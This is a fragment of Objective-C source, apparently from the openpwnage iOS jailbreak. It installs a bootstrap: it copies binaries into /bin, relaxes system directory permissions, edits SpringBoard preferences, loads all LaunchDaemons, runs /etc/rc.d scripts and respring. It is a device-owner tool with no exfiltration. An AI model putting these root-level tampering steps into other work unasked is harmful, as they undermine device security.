        olog("disabling stashing\n");
        run_cmd("/bin/touch /.cydia_no_stash");

        olog("copying tar\n");
        copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/tar"].UTF8String, "/bin/tar", NULL, COPYFILE_ALL);
        
        olog("copying launchctl\n");
        copyfile([[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/launchctl"].UTF8String, "/bin/launchctl", NULL, COPYFILE_ALL);
        
        olog("fixing perms...\n");
        chmod("/bin/tar", 0755);
        chmod("/bin/launchctl", 0755);
        chmod("/private", 0755);
        chmod("/private/var", 0755);
        chmod("/private/var/mobile", 0711);
        chmod("/private/var/mobile/Library", 0711);
        chmod("/private/var/mobile/Library/Preferences", 0755);
        mkdir("/Library/LaunchDaemons", 0777);
        FILE* fp = fopen("/.installed-openpwnage", "w");
        fprintf(fp, "do **NOT** delete this file, it's important. it's how we detect if the bootstrap was installed. thanks for using openpwnage! ♡zachary7829\n");
        fclose(fp);
        
        sync();
        
        olog("bootstrap installed\n");
        InstallBootstrap = true;
    } else {
        olog("bootstrap already installed\n");
    }
    
    olog("allowing jailbreak apps to be shown\n");
    NSMutableDictionary *springBoardPlist = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        
    [springBoardPlist setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
        
    [springBoardPlist writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
        
    char *ugh[] = {"killall", "-9", "cfprefsd",NULL};
    posix_spawn(&pid, "/usr/bin/killall", NULL, NULL, ugh, environ);
    
    if (InstallBootstrap){
        olog("i spent forever trying to figure out why this wouldn't work\n");
        olog("only to look at p0laris and see that i needed to uicache this whole time :P\n");
        olog("running uicache\n");
        run_cmd("su -c uicache mobile &");
    }
    
    olog("loading LaunchDaemons\n");
    run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
    run_cmd("/etc/rc.d/*");
        
    olog("Respring, and we're golden!\n");
    char *sd[] = {"killall", "-9", "backboardd",NULL};
    posix_spawn(&pid, "/usr/bin/killall", NULL, NULL, sd, environ);
    
    return true;
}
